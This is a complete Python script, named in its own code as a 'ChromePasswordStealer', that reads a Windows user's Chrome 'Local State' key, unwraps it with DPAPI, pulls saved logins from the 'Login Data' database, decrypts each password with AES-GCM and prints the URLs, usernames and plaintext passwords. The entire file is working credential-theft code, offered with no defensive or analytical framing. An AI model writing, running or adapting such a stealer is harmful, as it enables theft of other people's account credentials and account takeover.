import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from functools import wraps

CHROME_USER_DATA_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
CHROME_DB_PATH = os.path.join(CHROME_USER_DATA_PATH, "default", "Login Data")

def stealth_log(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        print(f"[{func.__name__.upper()}] Executing...")
        result = func(*args, **kwargs)
        print(f"[{func.__name__.upper()}] Completed.")
        return result
    return wrapper

def encrypt_check(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        if result is None:
            raise ValueError(f"[{func.__name__.upper()}] Encryption key retrieval failed.")
        return result
    return wrapper

def database_check(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        if not result:
            print(f"[{func.__name__.upper()}] No data found.")
        return result
    return wrapper

class ChromePasswordRetriever:
    @stealth_log
    @encrypt_check
    def retrieve_encryption_key(self):
        local_state_path = os.path.join(CHROME_USER_DATA_PATH, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as local_state_file:
            local_state = json.load(local_state_file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    
    @stealth_log
    def decrypt_password(self, encrypted_password, encryption_key):
        iv = encrypted_password[3:15]
        password_data = encrypted_password[15:]
        try:
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            return cipher.decrypt(password_data)[:-16].decode()
        except Exception:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]

    @stealth_log
    @database_check
    def retrieve_logins(self):
        with sqlite3.connect(CHROME_DB_PATH) as connection:
            cursor = connection.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created")
            return cursor.fetchall()
    
    @stealth_log
    def display_logins(self, logins, encryption_key):
        print("\n" + "=" * 70)
        print(f"{'Origin URL':<30} {'Username':<20} {'Password':<20}")
        print("=" * 70)
        for login in logins:
            origin_url, username, encrypted_password = login
            password = self.decrypt_password(encrypted_password, encryption_key)
            if username and password:
                print(f"{origin_url:<30} {username:<20} {password:<20}")
        print("=" * 70)

class ChromePasswordStealer:
    def __init__(self):
        self.retriever = ChromePasswordRetriever()

    def execute(self):
        encryption_key = self.retriever.retrieve_encryption_key()
        if encryption_key:
            logins = self.retriever.retrieve_logins()
            if logins:
                self.retriever.display_logins(logins, encryption_key)

if __name__ == "__main__":
    ChromePasswordStealer().execute()
